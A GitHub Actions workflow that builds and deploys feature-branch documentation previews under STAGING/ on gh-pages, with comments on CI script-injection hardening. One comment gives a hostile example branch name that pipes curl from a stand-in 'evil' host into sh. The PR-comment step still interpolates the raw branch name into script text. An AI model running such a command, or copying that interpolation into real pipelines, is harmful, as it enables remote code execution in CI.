name: Feature Staging (GitHub Pages)

# Deploy feature-branch rendered content to gh-pages under STAGING/<branch>/
# so reviewers can preview changes at:
#   https://<user>.github.io/<repo>/STAGING/<branch-slug>/
#
# This is the "before/after" comparison surface for publication review:
# - main renders at the Pages root (via docs-site.yml)
# - feature branches render under STAGING/<slug>/ (this workflow)
# - each deployment is stamped with the commit SHA, timestamp, and
#   source branch so it is always clear what is deployed
#
# Example scenario (from issue #215):
#   Author changes the immunization schedule → agent opens a feature branch →
#   agent renders the changed content → guidance review committee compares
#   STAGING/update-immunization-schedule/ against the main site → approves →
#   merge to main → STAGING/<slug>/ is cleaned up automatically.
#
# Cleanup: when a PR is merged or closed, the STAGING/<slug>/ directory
# is removed from gh-pages so stale previews don't accumulate.
#
# **This workflow is folio-generic.** It builds the docs site (Jekyll +
# TypeDoc), not the TeX paper PDF. A folio that also needs a staged PDF
# build should call publish.yml with publish_branch: gh-pages and the
# STAGING prefix — that is handled by the publish workflow's
# `publish_branch` input.

on:
  pull_request:
    types: [opened, synchronize, reopened]
    paths:
      - 'docs/**'
      - 'schemas/**'
      - 'content/**'
      - 'skills/**'
      - 'scripts/gen-schema-docs.ts'
      - 'scripts/gen-docs-pages.ts'
      - '.github/workflows/feature-staging.yml'
  pull_request_target:
    types: [closed]
  workflow_dispatch:
    inputs:
      branch:
        description: 'Branch to stage (leave blank to use current branch)'
        required: false
        default: ''
        type: string

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: staging-${{ github.event.pull_request.head.ref || github.ref_name }}
  cancel-in-progress: true

jobs:
  # ── Deploy feature branch to STAGING/ ─────────────────────────
  stage:
    if: github.event.action != 'closed'
    runs-on: ubuntu-latest
    # NO shared `gh-pages-push` group. This job keeps only the per-branch
    # workflow-level group above, plus the retry on its push.
    #
    # `eoix` gave it the shared group on the belief that a queued job WAITS.
    # It does not: GitHub cancels a PENDING job when a newer one queues for the
    # same group, and `cancel-in-progress: false` governs the RUNNING job, not
    # the pending one. So a third arrival silently drops the second.
    #
    # MEASURED 2026-09-19, which is what settles it — until then this was
    # derived and flagged as unverified on PR #300 and in bean `pdxk`. Three
    # staging runs from three DIFFERENT branches inside 17 seconds:
    #
    #   00:27:04  claude/fix-stale-kg-sidecar        cancelled
    #   00:27:09  claude/festive-galileo-s7ibx0      cancelled
    #   00:27:21  claude/wonderful-bohr-6kxh7b       ran
    #
    # Different branches, so the per-branch group cannot explain it; the shared
    # job-level group is the only thing they had in common. Two staging
    # previews lost, silently, and a cancelled job reads as intentional.
    #
    # The retry below is the mechanism that actually works here, and it is safe
    # for the same reason it is in `discoverability-docs`: each branch writes
    # its own `STAGING/<slug>/` with `keep_files: true`, so a re-clone picks up
    # whoever won and adds this branch's directory beside it.
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref || inputs.branch || github.ref }}

      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest

      - name: Install deps
        run: bun install --frozen-lockfile || bun install

      - name: Determine staging slug
        id: slug
        # `head.ref` is ATTACKER-CONTROLLED on a fork PR: a branch may be named
        # `x";curl evil|sh;"`. `${{ }}` is substituted into the script TEXT
        # before the shell parses it, so interpolating it here is command
        # injection, not quoting. Bound to env and read as a variable, the value
        # is data the shell never parses as program. Same pattern as
        # WorldHealthOrganization/smart-base's slash-command workflows:
        # "Pass the branch name via env to avoid script injection from untrusted data".
        env:
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
          INPUT_BRANCH: ${{ inputs.branch }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          # Sanitise the branch name for use as a URL path segment
          BRANCH="${HEAD_REF:-${INPUT_BRANCH:-$REF_NAME}}"
          SLUG=$(echo "$BRANCH" | sed 's|[^a-zA-Z0-9._-]|-|g' | sed 's|--*|-|g' | sed 's|^-||;s|-$||')
          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
          echo "branch=$BRANCH" >> "$GITHUB_OUTPUT"
          echo "Staging slug: $SLUG"

      - name: Regenerate generated docs
        run: |
          bun run scripts/gen-schema-docs.ts 2>&1 | tail -5 || true
          bun run scripts/gen-skill-docs.ts 2>&1 | tail -5 || true
          bun run scripts/gen-docs-pages.ts 2>&1 | tail -5 || true

      - name: Render BPMN workflow diagrams
        run: |
          npx --yes playwright install --with-deps chromium
          bun run render:bpmn 2>&1 | tail -10 || true

      # Stamp the build so a reviewer can tell WHAT is deployed from the
      # page itself — the core requirement from issue #215.
      - name: Stamp the build
        # `outputs.branch` is the RAW branch name — the slug is sanitised, the
        # branch is not — so it is attacker-controlled on a fork PR just as
        # `head.ref` is. Bound to env rather than interpolated.
        env:
          STAGING_BRANCH: ${{ steps.slug.outputs.branch }}
        run: |
          mkdir -p docs/_data
          {
            echo "sha: \"${GITHUB_SHA}\""
            echo "short_sha: \"${GITHUB_SHA:0:7}\""
            echo "built_at: \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\""
            echo "branch: \"${STAGING_BRANCH}\""
            echo "staging: true"
            echo "staging_slug: \"${{ steps.slug.outputs.slug }}\""
            echo "run_url: \"${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}\""
            echo "pr_number: \"${{ github.event.pull_request.number || '' }}\""
          } > docs/_data/build.yml
          cat docs/_data/build.yml

      # Set baseurl so Jekyll generates links relative to the STAGING subdir
      - name: Configure Jekyll for staging subdirectory
        run: |
          SLUG="${{ steps.slug.outputs.slug }}"
          # Append baseurl override to _config.yml so Jekyll generates all
          # links relative to /folio-assistant/STAGING/<slug>/
          echo "" >> docs/_config.yml
          echo "# Auto-appended by feature-staging.yml" >> docs/_config.yml
          echo "baseurl: \"/folio-assistant/STAGING/${SLUG}\"" >> docs/_config.yml

      - name: Build Jekyll site
        uses: actions/jekyll-build-pages@v1
        with:
          source: ./docs
          destination: ./_site

      - name: Take ownership of Jekyll output
        run: sudo chown -R "$(id -u):$(id -g)" ./_site

      - name: Generate TypeDoc API reference
        run: |
          npx --yes typedoc \
            --out ./_site/api \
            --entryPointStrategy expand \
            --readme none \
            --hideGenerator \
            --skipErrorChecking \
            --name "folio-assistant API (staging: ${{ steps.slug.outputs.slug }})" \
            schemas/types.ts schemas/constraints.ts schemas/builders.ts \
            schemas/assistant-types.ts schemas/assistant-package.ts \
            schemas/assistant-workflow.ts schemas/formalization-types.ts \
            schemas/lean-packages.ts 2>&1 | tail -10

      # Add a staging banner to every HTML page so a reviewer never
      # mistakes staged content for the published site.
      #
      # Muted sage (#4F6F52) with white text — 5.63:1, comfortably past the
      # 4.5:1 WCAG AA threshold for normal text. It replaced #d946ef, which
      # measured 3.46:1 against its own white text and so FAILED AA: the
      # banner was not merely glaring, it was the least readable element on
      # every staged page. Any replacement must be checked the same way; the
      # pale decorator sages (#9CAF88, #87A96B) all land near 2.5:1.
      #
      # Every monospace chip is a <span>, deliberately NOT a <code>. The
      # branch name used to be <code>, which picks up the theme's own `code`
      # rule — a near-white background in LIGHT mode — while inheriting the
      # banner's white text. White on white: the one piece of information the
      # banner exists to convey was invisible to exactly the readers using
      # the default theme. A <span> the theme has no selector for cannot
      # regress that way in either mode.
      # The graph's viewer page, emitted BEFORE the banner injection below so
      # the `find ./_site -name "*.html"` picks it up like every other page. It
      # is a page, not data: a reviewer opening it under STAGING/ should get
      # the same way back to the branch and the PR that every other page gives
      # them. The export itself runs later and stays unbannered, correctly —
      # injecting HTML into a JSON-LD document would corrupt it.
      #
      # It needs nothing from the export: the page resolves its document at
      # load time, from a path written in at generation time. So the order here
      # is free, and this is the useful end of it.
      - name: Emit the knowledge-graph viewer
        run: |
          STUB=$(bun -e 'const {readDeclaration,artefactStub}=await import("./schemas/cat-harness.ts");console.log(artefactStub(readDeclaration(".")))')
          bun run scripts/kg-viewer.ts --out "./_site/${STUB}/index.html"

      - name: Inject staging banner
        # PR title and body come through `env`, NOT `${{ }}` interpolation.
        # An expression is substituted into the script TEXT before bash sees
        # it, so a PR body containing a quote and a semicolon would execute —
        # a PR body is attacker-controlled on any repo taking outside
        # contributions. As environment variables they are data.
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
          # Raw branch name — the slug is sanitised, the branch is not.
          STAGING_BRANCH: ${{ steps.slug.outputs.branch }}
        # bash explicitly: the loop uses process substitution and ${var//a/b}.
        shell: bash
        run: |
          SHA="${GITHUB_SHA:0:7}"
          BRANCH="$STAGING_BRANCH"
          BUILT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          PR="${{ github.event.pull_request.number || 'n/a' }}"
          BRANCH_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/tree/${BRANCH}"
          MAIN_SITE="https://${{ github.repository_owner }}.github.io/${{ github.event.repository.name }}"
          # Which pages actually EXIST on the published main site.
          #
          # The compare link exists to put this page beside its counterpart on
          # main, so it has to name the page — landing the reader on the site
          # root asks them to re-navigate from memory to do the comparison the
          # link is for, and the deeper the page the less likely they bother.
          #
          # But a staging page may have NO counterpart: it is a page the branch
          # ADDS. Deep-linking unconditionally would publish a 404 on exactly
          # the pages a reviewer most wants to see. So the target is resolved
          # against the publish ref rather than composed by convention — the
          # same rule `readme-sections.ts` follows for PDF cells.
          #
          # `gh-pages` is not in this checkout (checkout@v4, depth 1), so fetch
          # a shallow copy of just that ref. Paths under STAGING/ are other
          # branches' previews, not the main site, and are excluded.
          MAIN_PAGES=""
          MAIN_PAGES_KNOWN=0
          if git fetch --depth=1 origin gh-pages >/dev/null 2>&1; then
            MAIN_PAGES="$(git ls-tree -r --name-only FETCH_HEAD 2>/dev/null | grep -v '^STAGING/' || true)"
            # An empty tree is a determined empty, but a failed read is not —
            # only claim knowledge when the listing actually produced paths.
            [ -n "$MAIN_PAGES" ] && MAIN_PAGES_KNOWN=1
          fi
          if [ "$MAIN_PAGES_KNOWN" = "1" ]; then
            echo "Read $(printf '%s\n' "$MAIN_PAGES" | wc -l) page(s) from the publish ref"
          else
            echo "Could not read the publish ref — compare links fall back to the site root"
          fi
          PR_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/pull/${PR}"
          # The issue this branch is FOR. A reviewer landing on a staged page
          # can see the branch, the commit and the PR, but not WHY the work
          # exists — which is the question a preview most often raises.
          #
          # Taken as the first issue reference in the PR title, else the body,
          # excluding the PR's own number (GitHub numbers issues and PRs from
          # one sequence, so "#258" in the body of PR 258 is a self-reference,
          # not an issue). Absent is a normal state, not an error: a branch
          # need not have an issue, and the banner simply omits the link.
          ISSUE="$(printf '%s\n%s\n' "$PR_TITLE" "$PR_BODY" \
            | grep -oE '#[0-9]+' | tr -d '#' \
            | grep -vx "$PR" | head -1 || true)"
          ISSUE_FRAGMENT=""
          if [ -n "$ISSUE" ]; then
            ISSUE_FRAGMENT=" · <a href=\"${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/issues/${ISSUE}\" style=\"color:#fff;text-decoration:underline\">issue #${ISSUE}</a>"
          fi
          # The banner must PUSH THE FIXED SIDEBAR DOWN, not sit on top of it.
          #
          # just-the-docs makes `.side-bar` `position: fixed; top: 0`. A
          # `position: sticky` banner is in normal flow and moves nothing that
          # is out of it, so the banner covered the top of the sidebar: the
          # site title, and part of the toolbar row holding the theme, reading
          # preferences, language and QR controls. A reader reported the
          # language selector "still not visible" — it was under the banner.
          #
          # A fixed offset would be wrong: the banner wraps to two or three
          # lines on a narrow viewport, and its height is not knowable here.
          # So measure it and publish the value as a custom property, on load
          # and on resize.
          OFFSET_STYLE="<style>:root{--fa-staging-offset:0px}.side-bar{top:var(--fa-staging-offset,0px)!important}</style>"
          OFFSET_SCRIPT="<script>(function(){function s(){var b=document.querySelector('[data-fa-staging-banner]');if(!b)return;document.documentElement.style.setProperty('--fa-staging-offset',b.getBoundingClientRect().height+'px');}if(document.readyState!=='loading')s();else document.addEventListener('DOMContentLoaded',s);window.addEventListener('resize',s);window.addEventListener('load',s);})();</script>"
          CHIP='font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:rgba(0,0,0,.22);color:#fff;padding:1px 6px;border-radius:3px'
          BANNER="<div data-fa-staging-banner style=\"background:#4F6F52;color:#fff;padding:8px 16px;font-size:14px;text-align:center;position:sticky;top:0;z-index:9999;font-family:system-ui\">🔀 <b>FEATURE BRANCH</b> — <a href=\"${BRANCH_URL}\" style=\"color:#fff;text-decoration:underline\"><span style=\"${CHIP}\">${BRANCH}</span></a> · commit <span style=\"${CHIP}\">${SHA}</span> · built ${BUILT} · <a href=\"${PR_URL}\" style=\"color:#fff;text-decoration:underline\">PR #${PR}</a>${ISSUE_FRAGMENT} · @@COMPARE@@ · <a href=\"${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}\" style=\"color:#fff;text-decoration:underline\">build log</a></div>${OFFSET_STYLE}${OFFSET_SCRIPT}"
          # Match the WHOLE opening tag, not the literal "<body". Matching
          # "<body" alone re-emitted "<body>" and left the original tag's own
          # ">" behind, so every staged page carried a stray ">" after the
          # banner — and any <body> carrying attributes came out as
          # "<body>BANNER class="..."">: attributes orphaned as visible text,
          # and the real tag stripped of them.
          #
          # Per-file, not one sed over everything: the compare link names THIS
          # page, so the banner is no longer a constant. Everything else in it
          # is, so only the one fragment is rebuilt per file.
          #
          # Three states, and the middle one is the reason this is not a
          # one-line change:
          #   present on main      -> deep link to the same page
          #   absent from main     -> site root, and SAY the page is new
          #   publish ref unread   -> site root, worded as today
          # "Could not tell" must never render as "this page is new": that
          # would label every page new on any run where the fetch failed.
          INJECTED=0
          NEW_PAGES=0
          while IFS= read -r f; do
            REL="${f#./_site/}"
            if [ "$MAIN_PAGES_KNOWN" = "1" ]; then
              if printf '%s\n' "$MAIN_PAGES" | grep -qxF "$REL"; then
                COMPARE="<a href=\"${MAIN_SITE}/${REL}\" style=\"color:#fff;text-decoration:underline\">compare with main ↗</a>"
              else
                COMPARE="<a href=\"${MAIN_SITE}/\" style=\"color:#fff;text-decoration:underline\">main ↗</a> <span style=\"opacity:.85\">(new page)</span>"
                NEW_PAGES=$((NEW_PAGES + 1))
              fi
            else
              COMPARE="<a href=\"${MAIN_SITE}/\" style=\"color:#fff;text-decoration:underline\">compare with main ↗</a>"
            fi
            PAGE_BANNER="${BANNER//@@COMPARE@@/$COMPARE}"
            sed -i "s|<body\([^>]*\)>|<body\1>${PAGE_BANNER}|" "$f" 2>/dev/null || true
            INJECTED=$((INJECTED + 1))
          done < <(find ./_site -name "*.html")
          echo "Injected staging banner into ${INJECTED} HTML files (${NEW_PAGES} with no counterpart on main)"

      # The branch's KG, published beside the branch's site, so the graph a
      # reviewer inspects is the one this PR produces rather than main's. The
      # export is data, not a page, so the banner injection above does not
      # touch it — which is why the `branch`/`sha` fields below matter: they
      # are the only thing saying which commit a JSON file came from.
      # The branch's graph, published beside the branch's site. --base-url is
      # load-bearing: without it every staged export would mint @ids pointing
      # at main's published document, and two different graphs would assert the
      # same IRIs — the preview would claim to BE the canonical graph.
      - name: Export the knowledge graph and its schema
        env:
          KG_BRANCH: ${{ steps.slug.outputs.branch }}
          SLUG: ${{ steps.slug.outputs.slug }}
        run: |
          BASE="https://${GITHUB_REPOSITORY_OWNER}.github.io/${GITHUB_REPOSITORY#*/}/STAGING/${SLUG}"
          STUB=$(bun -e 'const {readDeclaration,artefactStub}=await import("./schemas/cat-harness.ts");console.log(artefactStub(readDeclaration(".")))')
          # Both exporters stamp their own output with the build identity, from
          # the one `stagingStamp()` in scripts/staging-stamp.ts. It was an
          # inline `bun -e` here that rewrote the JSON-LD after the fact and
          # reached that document only — so every `*.schema.json` the second
          # command writes went out with no build identity at all (bean `lx2s`).
          # The stamp reads KG_BRANCH above plus the GITHUB_* variables the runner
          # sets for every step.
          bun run scripts/kg-export.ts             --base-url "$BASE" --out "./_site/${STUB}.jsonld"
          bun run scripts/harness-schema-export.ts --base-url "$BASE" --out-dir ./_site
          # The `.json` alias is copied AFTER the export, so the two documents
          # cannot disagree about which build they came from.
          cp "./_site/${STUB}.jsonld" "./_site/${STUB}.json" 
        shell: bash

      # The QA witnesses, published at the path the badges already point at.
      #
      # They are COMMITTED under `test/results/witnesses/` — placement follows
      # provenance, and a witness is a QA process's output, not an authored
      # page. They are SERVED from `/assets/qa/`, which is what every
      # `data-qa-src` in the generated pages says and what `docs-ui.js` fetches.
      # Jekyll only builds `docs/`, so without this copy the panel 404s on
      # every badge — and an empty panel looks exactly like "nothing has been
      # audited", which is the false pass the badges exist to prevent.
      #
      # `-T` so the CONTENTS land in `assets/qa/` rather than a nested
      # `assets/qa/witnesses/`. Mirrored in `feature-staging.yml`; a test
      # asserts both workflows carry it, because missing it in one publishes a
      # site whose evidence links are all dead.
      - name: Publish the QA witnesses and results
        run: |
          mkdir -p ./_site/assets
          cp -rT test/results/witnesses ./_site/assets/qa
          # The RESULTS beside them. `kg-export` writes this during the export
          # step above, so the copy picks up THIS run's findings rather than
          # whatever was last committed. Since bean `2634` the published graph
          # no longer carries them, so this file is the only place a consumer
          # can see what the QA pass found about the document it just fetched.
          find test/results -maxdepth 1 -name '*.qa-results.json' -exec cp {} ./_site/assets/qa/ \;
          echo "Published $(find ./_site/assets/qa -name '*.json' | wc -l) QA document(s)"

      - name: Disable Jekyll on published branch
        run: touch ./_site/.nojekyll

      # The queue above covers staging-vs-staging. It does NOT cover the five
      # OTHER workflows that push to `gh-pages` — blueprint, discoverability-docs,
      # docs-site, lean_ci and publish — because a concurrency group only
      # serialises the jobs that name it, and none of them do. So the push is
      # also retried once: the action re-fetches `gh-pages` on the second run,
      # which is exactly what the rejection asked for.
      #
      # `continue-on-error` on the first attempt only. If the retry fails too,
      # it fails the job — a lost staging deploy must stay visible.
      - name: Deploy to gh-pages/STAGING/<slug>
        id: deploy
        continue-on-error: true
        uses: peaceiris/actions-gh-pages@v4
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./_site
          destination_dir: STAGING/${{ steps.slug.outputs.slug }}
          publish_branch: gh-pages
          keep_files: true
          commit_message: 'staging(${{ steps.slug.outputs.slug }}): from ${{ github.sha }}'

      - name: Retry deploy (another workflow pushed to gh-pages first)
        if: steps.deploy.outcome == 'failure'
        uses: peaceiris/actions-gh-pages@v4
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./_site
          destination_dir: STAGING/${{ steps.slug.outputs.slug }}
          publish_branch: gh-pages
          keep_files: true
          commit_message: 'staging(${{ steps.slug.outputs.slug }}): from ${{ github.sha }} (retry)'

      - name: Comment staging URL on PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const slug = '${{ steps.slug.outputs.slug }}';
            const sha = '${{ github.sha }}'.substring(0, 7);
            const owner = context.repo.owner;
            const repo = context.repo.repo;
            const url = `https://${owner}.github.io/${repo}/STAGING/${slug}/`;
            const body = `## 🔍 Staging preview deployed

            **URL:** ${url}
            **Commit:** \`${sha}\`
            **Branch:** \`${{ steps.slug.outputs.branch }}\`

            Every page carries a sage banner linking back to the branch, this PR, the issue it is for, the main site, and the build log.

            > Compare with [main site](https://${owner}.github.io/${repo}/) to review changes.`;
            
            // Update existing comment or create new one
            const comments = await github.rest.issues.listComments({
              owner, repo, issue_number: context.issue.number,
            });
            const existing = comments.data.find(c => 
              c.user.login === 'github-actions[bot]' && 
              c.body.includes('Staging preview deployed')
            );
            if (existing) {
              await github.rest.issues.updateComment({
                owner, repo, comment_id: existing.id, body,
              });
            } else {
              await github.rest.issues.createComment({
                owner, repo, issue_number: context.issue.number, body,
              });
            }

  # ── Cleanup: remove STAGING/<slug>/ when PR is closed ─────────
  # REQUIRES explicit user confirmation via the 'staging:cleanup' label.
  # Without that label, staging persists so reviewers can still compare.
  cleanup:
    if: github.event.action == 'closed'
    runs-on: ubuntu-latest
    # NO shared group, for the reason above: a queued job is cancelled by the
    # next arrival rather than waiting. This job already has the mechanism that
    # works — a three-attempt rebase-and-push loop below — and a cleanup that
    # removes one directory loses nothing by rebasing onto whatever landed.
    steps:
      - uses: actions/checkout@v4
        with:
          ref: gh-pages

      - name: Determine staging slug
        id: slug
        # THE SERIOUS ONE. This job runs on `pull_request_target`, which carries
        # the BASE repository's token and secrets with `contents: write` — so an
        # interpolated fork branch name is arbitrary code execution with write
        # access, triggered by closing a PR. Bound to env.
        env:
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          BRANCH="$HEAD_REF"
          SLUG=$(echo "$BRANCH" | sed 's|[^a-zA-Z0-9._-]|-|g' | sed 's|--*|-|g' | sed 's|^-||;s|-$||')
          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"

      - name: Check for cleanup confirmation
        id: check
        env:
          LABELS_JSON: ${{ toJSON(github.event.pull_request.labels.*.name) }}
        run: |
          # Only remove staging if the PR has the 'staging:cleanup' label.
          # Via env: a label containing a single quote would otherwise close the
          # quoting and run as a command.
          LABELS="$LABELS_JSON"
          if echo "$LABELS" | grep -q 'staging:cleanup'; then
            echo "confirmed=true" >> "$GITHUB_OUTPUT"
          else
            echo "confirmed=false" >> "$GITHUB_OUTPUT"
          fi

      - name: Remove staging directory (confirmed)
        if: steps.check.outputs.confirmed == 'true'
        run: |
          SLUG="${{ steps.slug.outputs.slug }}"
          if [ -d "STAGING/$SLUG" ]; then
            rm -rf "STAGING/$SLUG"
            git config user.name 'github-actions[bot]'
            git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
            git add -A "STAGING/$SLUG"
            git commit -m "staging(cleanup): remove STAGING/$SLUG (PR #${{ github.event.pull_request.number }} closed)" || true
            # Same race as the deploy above, and the same reason a queue is not
            # enough: five other workflows push to `gh-pages` without joining
            # it. Rebase and retry rather than losing the cleanup — our commit
            # only removes one STAGING/ directory, so it rebases onto whatever
            # landed first without touching it.
            for attempt in 1 2 3; do
              if git push origin gh-pages; then
                echo "pushed on attempt $attempt"
                break
              fi
              if [ "$attempt" = 3 ]; then
                echo "::error::could not push cleanup after 3 attempts"
                exit 1
              fi
              echo "push rejected; rebasing onto origin/gh-pages and retrying"
              git pull --rebase origin gh-pages
              sleep $((attempt * 5))
            done
            echo "Cleaned up STAGING/$SLUG"
          else
            echo "No staging directory found for $SLUG (already cleaned up)"
          fi

      - name: Post retention notice (not confirmed)
        if: steps.check.outputs.confirmed == 'false'
        uses: actions/github-script@v7
        with:
          script: |
            const { owner, repo } = context.repo;
            const slug = '${{ steps.slug.outputs.slug }}';
            const pagesUrl = `https://${owner}.github.io/${repo}/STAGING/${slug}/`;
            const body = [
              '### 📌 Staging preview retained',
              '',
              `The staging preview at [${pagesUrl}](${pagesUrl}) has **not** been removed.`,
              '',
              'To remove it, add the \`staging:cleanup\` label to this PR and re-run',
              'this workflow, or manually delete the `STAGING/' + slug + '/` directory',
              'from the `gh-pages` branch.',
              '',
              '_Staging previews require explicit human confirmation to remove,_',
              '_so reviewers can continue comparing before/after._',
            ].join('\n');
            await github.rest.issues.createComment({
              owner, repo, issue_number: context.issue.number, body,
            });

